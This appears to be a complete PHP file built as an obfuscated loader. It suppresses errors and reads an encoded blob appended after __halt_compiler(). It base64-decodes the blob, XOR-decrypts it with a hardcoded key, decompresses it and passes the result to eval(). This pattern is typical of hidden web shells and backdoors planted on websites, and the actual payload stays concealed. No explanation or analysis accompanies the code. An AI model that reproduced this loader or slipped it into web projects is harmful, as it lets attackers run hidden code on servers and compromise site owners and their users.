<?php
@error_reporting(0);
function xor_decipher($data, $key) {
    $keyLen = strlen($key);
    $output = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $output .= $data[$i] ^ $key[$i % $keyLen];
    }
    return $output;
}
$key = 'injek';
$payload = substr(file_get_contents(__FILE__), __COMPILER_HALT_OFFSET__);
$decoded_b64 = base64_decode($payload); 
$decrypted_xor = xor_decipher($decoded_b64, $key); 
$code = gzinflate($decrypted_xor);
eval('?>' . $code);
__halt_compiler();rDYHCrBffpR7S5aPQAH7ZSq8X1+q/jJL0a0zYdEej1ZB48l5BoMJGvhL/8GJEy2VnuXNSqHr+G9z7H/lTHN1u1B2PHNZ0nHxJZrXdS/A87KZngrFxPnfFnRR8VUs50fIRboC2y2rSivy+cYoghGTvJWgsnOls3cojviJz0ftHEpLGexXCzJXOAfyhUbmv11qrKkdxF2gFXfZaajOk3U+NuPFZuJE+2q0hGHHS+AkCwxbiuyEqsEvxM97wu6WwEKelwNHipdnbacrKcAQ7VsrTio56J26LP5DiwN1I6yM8ffC3VEB0a8gsOXuDrlk6AKW+pAlJEeMKLw6GSsnA1d4vcdzqeENIz3fEDfIj4Qqea7x506Z0HqszilHSwThpPYu+PtQMT7nQjeK7WJpVjs2BT+NXxAiurwGmKIDm6/PzzfWc9f+LfqfEo8V7dBxySG2oIf2Yt4ZzKj69J0gzwlgnUDq3i8+b8D+m8vqJC4+NtjZCTDYVFkDWN/zdjI1yju7+pe7r17tSjJY+7rcCjjLQ2vUfyDteexBzvLla/XEGxKe5aicS0UMSejKO/Op5z40wlggWNBrW2z8zB8ArjwE9HOXfx0CKSlIrrJh/WCkgn+bWvkgPyYuiOuCYIpGUwRnkK1vz4P/Z6XHZ7tg/mcgT74Zyy0GKI02CE+k4GCkiIsOmd3oB9vhnMYo+TR8e6xld616Rdg7AvgtI70mOKHwi94oPca73dID+JEsycQua1IcmpGuA00qS1kcYoB0Jn8QgB9CMjUQXyoW84jE7iGRZFVOVEBm+d5WhPlcns46/bVVLANT7vG62ybKTBr0BEHocUAr1E9IRAIvO7B80wTINLL4WXCJUJvKyxm6nd8X8B+1HhLAD6Qb2XpaT7LfaLpxHTZMfqwLwkmSHrA0fGUATcvWGf0zzr1H7hdF6mKkUm8nZVzE4Usf5X46yY5AvZc4j5hQdoQd5kPkWbDf48Vx8crX28PaCqaVD7qJn0+OIDmjbkKQTG3WR4ICgezkp9qMjyxM9U3+J7qtBDff94Zssn29wNVclGUTGgY923el7Y841BHCtdvCKFbynb08pZQvoVA2OKd+/s3bvhVKwp7bBDZBkv70cRDB4JQm/+Prub5PV78yYhYq9bfYloqo6KlHaE9LLRM90X8wq7qUSNdolF9CXUqvewbfdy5H18indXd2VA1TtPfmG9R3MyfG3MqHwZTumn+odfein7+xAjAsgU7ZZQ0PsIJ8uoNuKGuKOsEMFB5x9JCYwsuv8cZ07oiCH9bZy3AtTbDlAcMBap/6b/Wk8MPUzcRQW/ootxmxspMetQMsNw/vnxe1tNbe60DSSVjfaMEWKNQh0unDPwbi0N2xtQgF57psRtjdoiE8FCdUXsURNHG8FxgaY0CfCsbLzzul55+BUb9n5gEn1RYLsuLNPE01yrJKCpRU0uzsgympWDIdMKsatG1f+AHYV0S9WKdOi9J7DvrKtbquRUge1qRFlcFWVxt6xzOoMf4WVTaVnwSn5odtIOi38yuzlgyMlbl21u0LR7J0se2UnqAGdbXruv1HyVKJV1HC1Z2K1LxNMqpIDPrtIDMtHvbzN6KfLRFL78EVBuxYIdt3DN9FyL1ezFjVwIUrbOh3lf959/l/FJXTyvnUtcjzRyIfOMaveIsgqSIY+7d2F0Xf6QyROihe5bh85Z2LMefdmoHl33XeT72j1Q7SZ5xTqqWQizDLAN+5dJFoCAa0cZD0hACrG+x2kRQCshM80VEkxtrnvwAaM8g/wDrO3S2ih3/VFFEDuQdmkLUKp3KMpHdKFBpvpHbPsk1EIy3CAwmBNjHjpDioezYhEcPzu3LAG+xec5TwhhDGArpK1RF2c3SDInSPszIWdmpcqJTMWQzwOZNLu1HDVMfeiFI6V7r6NGPQDuczkqTmamlSh1R/ZR3XnQhuEhKz8B729ZGo3hfFzFgrlgGIOg==